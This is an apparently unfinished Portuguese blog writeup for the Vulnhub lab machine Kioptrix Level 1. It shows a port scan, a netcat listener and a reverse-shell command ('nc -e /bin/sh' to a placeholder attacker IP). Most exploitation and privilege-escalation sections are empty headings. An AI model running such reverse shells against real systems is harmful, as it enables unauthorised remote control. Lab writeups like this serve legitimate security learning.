---
published: true
author: EEP0x10
date: '2020-12-12'
categories:
  - SecInfo
  - Writeup
tags:
  - Writeup
  - Vulnhub
---
![Logo](https://miro.medium.com/max/700/1*cQaJW6HmJO_lm3lsewVdug.png){: width="240" class="right"}
## Informações

|:-----------------------------|:-------------|
| Nome                         |[Kioptrix: Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)|
| Lançamento                   | 17/02/2010   | 
| Criador                      | [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)         |


> Sistema Usado nos testes: Windows 10 + WSL2 Ubuntu


## Scan
Ferramenta usada: [Rustscan](https://github.com/RustScan/RustScan)
```terminal
$ rustscan 192.168.0.37 -- -Pn -sV
```
Resultado 1 : Varrimento de todas as portas
```terminal
Open 192.168.0.37:22
Open 192.168.0.37:80
Open 192.168.0.37:111
Open 192.168.0.37:139
Open 192.168.0.37:443
Open 192.168.0.37:1024
```
Resultado 2 : Nmap nas portas abertas
```terminal
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        syn-ack Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     syn-ack 2 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    syn-ack Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
1024/tcp open  status      syn-ack 1 (RPC #100024)
```

> O **rustscan** é usado com a função de ***varrer todas as portas de um host rapidamente***, e em seguida, **ele mesmo executa o nmap**, utilizando os parâmetros definidos após o "**--**", realizando nesse caso um Service / Version Scan (-sV) nas portas abertas.

## Enumeração

### Porta X

## Exploitation 

Pegamos a shell

![Shell](https://i.redd.it/8wlaab8isi611.jpg)

## Post-Exploitation

### Shell Upgrade

Agora vamos melhorar nossa shell, pois será nossa área de trabalho daqui para frente.

Descobrir se no host se existe netcat

```terminal
command > whereis nc

```

Enviar a `reverse shell` para nosso netcat
> Dica: Esse site facilita o processo para fazer o reverse shell, vale apena dar uma olhada:  https://weibell.github.io/reverse-shell-generator/

1- Primeiro é preciso deixar nosso netcat escutando em uma porta no nosso `host local`
```terminal
$ rlwarp nc -nvlp YYYY
```

> YYYY é equivalente a porta escolhida para escutar

> **rlwarp** é um programa que pode ser usado junto do netcat para registrar e puxar o histórico de comandos utilizados.

2- Após isso, é preciso enviar a reverse shell do `host remoto` para nosso netcat `local`
```terminal
command > nc -e /bin/sh 10.10.XX.XX YYYY
```

> XX é equivalente a seu ip na VPN do HTB. 
Ele pode ser verificado por meio do comando para Windows: ipconfig ou para Linux: ip addr

3- Verificar se existe python3 no host remoto

```terminal
$ nc -nvlp 2123
Listening on 0.0.0.0 YYYY
Connection received on 
```

4- Fazer o upgrade da shell com python3

```terminal

```

### Privilege Escalation

#### Enumeration II

#### User.txt

#### Root.txt

![root](https://memegenerator.net/img/instances/41953756/get-rooted-feel-the-power.jpg)

